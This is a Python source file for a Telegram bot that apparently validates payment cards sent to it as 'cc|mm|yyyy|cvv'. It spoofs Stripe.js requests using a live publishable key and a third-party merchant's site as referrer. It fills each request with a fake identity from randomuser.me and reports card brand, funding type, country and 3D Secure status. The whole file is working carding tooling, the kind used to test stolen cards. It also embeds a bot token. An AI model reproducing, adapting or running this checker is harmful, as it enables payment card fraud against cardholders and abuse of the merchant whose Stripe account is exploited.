import telebot
import requests
import logging
import json
import uuid
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import pycountry

# Telegram Bot Token
BOT_TOKEN = "6561482740:AAFrL7jzYQGt9rmlAweJH-JhBjZ9o5VnsjU"  # Replace with your actual bot token

# Stripe API Key
API_KEY = "pk_live_8AOKNZetuMq5MDbq6uKUyjDM"  # Replace with your Stripe API key

# Initialize TeleBot
bot = telebot.TeleBot(BOT_TOKEN)

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(message)s")

def convert_country_to_code(country_name):
    """Convert full country name to ISO 3166-1 alpha-2 code."""
    try:
        country = pycountry.countries.get(name=country_name)
        return country.alpha_2 if country else None
    except Exception as e:
        logging.error(f"Error converting country name to code: {e}")
        return None

def get_random_user():
    """Fetch a random user's details including address using Random User API."""
    try:
        logging.info("Fetching random user details...")
        response = requests.get("https://randomuser.me/api/", timeout=10)
        response.raise_for_status()
        user_data = response.json()

        # Extract user details
        name = f"{user_data['results'][0]['name']['first']} {user_data['results'][0]['name']['last']}"
        email = user_data['results'][0]['email']
        address = user_data['results'][0]['location']
        country_code = convert_country_to_code(address['country'])

        full_address = {
            "line1": f"{address['street']['number']} {address['street']['name']}",
            "city": address['city'],
            "state": address['state'],
            "postal_code": address['postcode'],
            "country": country_code,
        }

        logging.info(f"Random user generated: {name}, {email}, {full_address}")
        return name, email, full_address
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to fetch random user: {e}")
        return None, None, None

def create_payment_method(cc, cvv, mes, ano, name, email, address, time_on_page, api_key):
    """Create a payment method on Stripe."""
    url = "https://api.stripe.com/v1/payment_methods"

    # Headers based on the provided curl
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    }

    # Data payload for the request
    data = {
        "type": "card",
        "billing_details[name]": name,
        "billing_details[email]": email,
        "billing_details[address][line1]": address.get("line1", ""),
        "billing_details[address][city]": address.get("city", ""),
        "billing_details[address][state]": address.get("state", ""),
        "billing_details[address][postal_code]": address.get("postal_code", ""),
        "billing_details[address][country]": address.get("country", ""),
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "guid": str(uuid.uuid4()),
        "muid": str(uuid.uuid4()),
        "sid": str(uuid.uuid4()),
        "payment_user_agent": "stripe.js/d7f2cc0ba1; stripe-js-v3/d7f2cc0ba1; split-card-element",
        "referrer": "https://www.dalewooddesignsgb.co.uk",
        "time_on_page": time_on_page,
        "key": api_key,
    }

    try:
        logging.info("Sending request to Stripe API...")
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("https://", adapter)

        response = session.post(url, headers=headers, data=data, timeout=10)
        response.raise_for_status()
        logging.info("Payment method created successfully!")
        return response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
        return None

def format_response(response, cc, mes, ano, cvv):
    """Format and return relevant card details."""
    if not response or "card" not in response:
        return "❌ Card check failed. Invalid response."

    card = response["card"]
    formatted_response = (
        f"✅ **Card Details** ✅\n"
        f"`{cc}|{mes}|{ano}|{cvv}`\n"
        f"**Card Brand:** {card.get('brand', 'Unknown')}\n"
        f"**Funding Type:** {card.get('funding', 'Unknown')}\n"
        f"**Card Type:** {response.get('type', 'Unknown')}\n"
        f"**Country:** {card.get('country', 'Unknown')}\n"
        f"**3D Secure Supported:** {card['three_d_secure_usage']['supported']}\n"
        f"**Status:** {'3D Secure Required' if card['three_d_secure_usage']['supported'] else 'Accepted'}"
    )
    return formatted_response

# Telegram Command Handler
@bot.message_handler(commands=["start"])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Send me card details in this format:\n`cc|mm|yyyy|cvv`")

@bot.message_handler(func=lambda message: "|" in message.text)
def check_card(message):
    try:
        card_data = message.text.split("|")
        if len(card_data) != 4:
            bot.reply_to(message, "❌ Invalid format. Use `cc|mm|yyyy|cvv`.")
            return

        cc, mes, ano, cvv = card_data
        time_on_page = 33381

        # Fetch random user details
        name, email, address = get_random_user()
        if not name or not email or not address:
            bot.reply_to(message, "❌ Failed to fetch random user details.")
            return

        # Create payment method
        result = create_payment_method(cc, cvv, mes, ano, name, email, address, time_on_page, API_KEY)
        if result:
            formatted_response = format_response(result, cc, mes, ano, cvv)
            bot.reply_to(message, formatted_response, parse_mode="Markdown")
        else:
            bot.reply_to(message, "❌ Card check failed. Please try again.")
    except Exception as e:
        logging.error(f"Error: {e}")
        bot.reply_to(message, "❌ An error occurred. Please try again later.")

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is running...")
    bot.polling(none_stop=True)
